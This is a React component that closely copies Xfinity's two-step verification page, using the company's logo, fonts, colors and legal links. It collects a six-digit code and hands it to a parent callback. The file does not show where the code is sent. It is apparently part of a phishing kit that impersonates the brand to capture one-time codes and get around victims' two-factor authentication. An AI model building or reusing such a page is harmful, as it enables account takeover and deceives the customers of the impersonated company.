import React, { useState } from 'react';
import Spinner from './common/Spinner';
import OtpInput from './common/OtpInput';

interface XfinityOtpPageProps {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  errorMessage?: string;
  email?: string;
}

const XfinityOtpPage: React.FC<XfinityOtpPageProps> = ({ onSubmit, isLoading, errorMessage, email }) => {
  const [otp, setOtp] = useState('');

  const handleOtpComplete = (completedOtp: string) => {
    setOtp(completedOtp);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length === 6) {
      onSubmit(otp);
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: '#fff', fontFamily: "'XfinityBrown', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif", display: 'flex', flexDirection: 'column' }}>
      <style>{`
        @font-face {
          font-family: 'XfinityBrown';
          src: url('https://static.cimcontent.net/common-web-assets/fonts/xfinity-brown-optimized/xfinitybrown-bold.woff2') format('woff2');
          font-weight: 700;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'XfinityBrown';
          src: url('https://static.cimcontent.net/common-web-assets/fonts/xfinity-brown-optimized/xfinitybrown-regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
        .xfinity-otp-input input {
          background: #F6F6F9 !important;
          color: #141417 !important;
          border-color: #CECED8 !important;
        }
        .xfinity-otp-input input:focus {
          border-color: #5A23B9 !important;
          ring-color: #5A23B9 !important;
        }
      `}</style>

      <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, padding: '2.5rem 1.5rem 0' }}>
        <div style={{ width: '100%', maxWidth: '564px', margin: '0 auto' }}>
          {/* Xfinity Logo */}
          <div style={{ display: 'flex', alignItems: 'center', marginBottom: '2.5rem' }}>
            <svg width="107" height="24" viewBox="0 0 107 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M16.845 0L12.558 5.55 8.27 0H0l8.998 11.55L0 23.1h8.27l4.288-5.55 4.287 5.55h8.27l-8.998-11.55L25.115 0h-8.27zM27.07 3.8h5.88v19.3h-5.88V3.8zm2.94-3.8c1.94 0 3.35 1.2 3.35 2.8s-1.41 2.8-3.35 2.8-3.35-1.2-3.35-2.8S28.07 0 30.01 0zM40.34 3.8v2.6c1.48-1.95 3.63-3.1 6.21-3.1 4.31 0 7.24 2.83 7.24 7.55V23.1h-5.88V12.08c0-2.58-1.44-4.03-3.65-4.03-2.37 0-3.92 1.53-3.92 4.36V23.1h-5.88V3.8h5.88zM56.31 3.8h5.88v19.3h-5.88V3.8zm2.94-3.8c1.94 0 3.35 1.2 3.35 2.8s-1.41 2.8-3.35 2.8-3.35-1.2-3.35-2.8S57.31 0 59.25 0zM73.97 8.1h-4.45V14c0 3.15 1.2 4.05 3.28 4.05.48 0 .93-.05 1.17-.12v5.12c-.56.15-1.42.25-2.37.25-5.22 0-7.96-2.5-7.96-8.2V8.1h-3.2V3.8h.88c2.12 0 3.12-1.05 3.12-3.15V.38l4.6-.38v3.8h4.93v4.3zM84.86 24c-2.38 0-4.33-.55-6.18-1.55l1.93-4.2c1.28.7 2.65 1.2 3.98 1.2 1.88 0 2.95-.88 3.78-2.68l.2-.43-8.27-12.54h6.28l4.82 8.85L95.6 3.8h6.02L92.13 22.1C90.58 23.45 88.24 24 84.86 24zM106.23 0a.77.77 0 1 1 0 1.54.77.77 0 0 1 0-1.54z" fill="#141417"/>
            </svg>
          </div>

          {/* Heading */}
          <h1 style={{ fontSize: '2rem', fontWeight: 700, color: '#141417', marginBottom: '0.75rem', lineHeight: 1.2 }}>
            Two-Step Verification
          </h1>

          <p style={{ fontSize: '1rem', color: '#6B6B76', marginBottom: '0.5rem' }}>
            Enter the 6-digit code sent to your device.
          </p>

          {email && (
            <p style={{ fontSize: '0.9375rem', color: '#141417', marginBottom: '1.5rem', fontWeight: 500 }}>
              {email}
            </p>
          )}

          <form onSubmit={handleSubmit}>
            {errorMessage && (
              <div style={{
                padding: '0.75rem 1rem',
                marginBottom: '1rem',
                borderRadius: '0.5rem',
                backgroundColor: '#FEE2E2',
                border: '1px solid #FCA5A5',
                color: '#DC2626',
                fontSize: '0.875rem',
                display: 'flex',
                alignItems: 'center',
                gap: '0.5rem'
              }}>
                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                  <path d="M8 1C4.1 1 1 4.1 1 8s3.1 7 7 7 7-3.1 7-7-3.1-7-7-7zm-.5 3h1v5h-1V4zm.5 8.2c-.4 0-.8-.3-.8-.8s.3-.8.8-.8.8.3.8.8-.4.8-.8.8z"/>
                </svg>
                <span>{errorMessage}</span>
              </div>
            )}

            <div className="xfinity-otp-input" style={{ marginBottom: '2rem' }}>
              <OtpInput length={6} onComplete={handleOtpComplete} disabled={isLoading} />
            </div>

            <button
              type="submit"
              disabled={isLoading || otp.length !== 6}
              style={{
                width: '100%',
                padding: '0.875rem',
                fontSize: '1rem',
                fontWeight: 700,
                color: '#fff',
                backgroundColor: isLoading || otp.length !== 6 ? '#B8A1D8' : '#5A23B9',
                border: 'none',
                borderRadius: '2rem',
                cursor: isLoading || otp.length !== 6 ? 'not-allowed' : 'pointer',
                fontFamily: 'inherit',
                transition: 'background-color 0.2s',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '0.5rem',
              }}
              onMouseEnter={(e) => { if (!isLoading && otp.length === 6) (e.target as HTMLButtonElement).style.backgroundColor = '#36156F'; }}
              onMouseLeave={(e) => { if (!isLoading && otp.length === 6) (e.target as HTMLButtonElement).style.backgroundColor = '#5A23B9'; }}
            >
              {isLoading && <Spinner size="sm" color="border-white" />}
              {isLoading ? 'Verifying...' : 'Verify Code'}
            </button>
          </form>

          <p style={{ fontSize: '0.75rem', color: '#6B6B76', marginTop: '1.5rem', lineHeight: 1.5 }}>
            By signing in, you agree to our{' '}
            <a href="http://my.xfinity.com/terms/web/" target="_blank" rel="noopener noreferrer" style={{ color: '#5A23B9', textDecoration: 'none' }}>Terms of Service</a>
            {' '}and{' '}
            <a href="https://www.xfinity.com/privacy/" target="_blank" rel="noopener noreferrer" style={{ color: '#5A23B9', textDecoration: 'none' }}>Privacy Policy</a>.
          </p>
        </div>
      </main>
    </div>
  );
};

export default XfinityOtpPage;
